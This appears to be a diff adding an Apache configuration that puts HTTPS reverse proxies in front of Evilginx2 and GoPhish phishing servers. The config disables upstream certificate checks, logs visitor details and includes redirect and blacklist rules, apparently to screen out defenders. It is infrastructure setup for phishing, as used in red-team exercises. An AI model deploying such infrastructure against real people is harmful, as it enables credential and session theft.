@@ -1,0 +1,48 @@
+<VirtualHost *:443>
+    ServerAlias evilginx2.template 
+    SSLEngine on
+    SSLProxyEngine On
+    SSLProxyVerify none 
+    SSLProxyCheckPeerCN off
+    SSLProxyCheckPeerName off
+    SSLProxyCheckPeerExpire off
+    SSLCertificateFile
+    SSLCertificateChainFile
+    SSLCertificateKeyFile
+    ProxyPreserveHost On
+    ProxyPass / https://0.0.0.0:8443/
+    ProxyPassReverse / https://0.0.0.0:8443/
+    ErrorLog ${APACHE_LOG_DIR}/error.log
+    CustomLog ${APACHE_LOG_DIR}/access_evilginx2.log "%h \"%r\" \"%{Referer}i\" \"%{User-Agent}i\""
+    Include /etc/apache2/redirect.rules
+<Location />
+    <RequireAll>
+        Require all granted
+        Include /etc/apache2/blacklist.conf
+    </RequireAll>
+</Location>
+</VirtualHost>
+<VirtualHost *:443>
+    ServerAlias gophish.template
+    SSLEngine on
+    SSLProxyEngine On
+    SSLProxyVerify none 
+    SSLProxyCheckPeerCN off
+    SSLProxyCheckPeerName off
+    SSLProxyCheckPeerExpire off
+    SSLCertificateFile
+    SSLCertificateChainFile
+    SSLCertificateKeyFile
+    ProxyPreserveHost On
+    ProxyPass / https://127.0.0.1:8080/
+    ProxyPassReverse / https://127.0.0.1:8080/
+    ErrorLog ${APACHE_LOG_DIR}/error.log
+    CustomLog ${APACHE_LOG_DIR}/access_gophish.log combined
+    Include /etc/apache2/redirect.rules
+<Location />
+    <RequireAll>
+        Require all granted
+        Include /etc/apache2/blacklist.conf
+    </RequireAll>
+</Location>
+</VirtualHost>
